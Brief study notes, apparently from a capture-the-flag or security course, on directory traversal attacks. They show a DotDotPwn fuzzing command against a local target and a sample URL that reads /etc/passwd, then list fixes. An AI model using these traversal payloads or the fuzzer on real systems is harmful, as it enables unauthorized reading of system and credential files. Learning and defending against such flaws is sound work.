Directory Traversal or "dot-dot-slash"

-	reading arbitrary files via directory traversal

-	access and view files located in the web server file system
	but outside of the web application’s document root folder

-	this exploit allows to read sensitive files from
	the root directory of the host system

-	exploit can be easily automated with the tool DotDotPwn
	->	install perl
		->	macOS:	brew install perl
		->	linux:	sudo apt install perl
	->	git clone https://github.com/wireghoul/dotdotpwn.git
	->	./dotdotpwn.pl -m http-url -u http://127.0.0.1/index.php\?page\=submit/../../../../TRAVERSAL -k "flag"
		->	-m specifies which module to be used, in this case http-url
		->	-u	the URL with the part to be fuzzed marked as TRAVERSAL
		->	-k <string_pattern>
			String pattern to match in the response if it's vulnerable

-	Vulnerable URL
	-> http://127.0.0.1/index.php?page=../../../../../../../../etc/passwd



Fixes:

	-	don’t store sensitive configuration files inside the web root
	-	avoid passing any filenames in user input
	-	create white list of safe file paths
	-	run web app in a limited environment
		->	for example a seperate Docker container
	-	deny access to any parent directories relative to the web server root
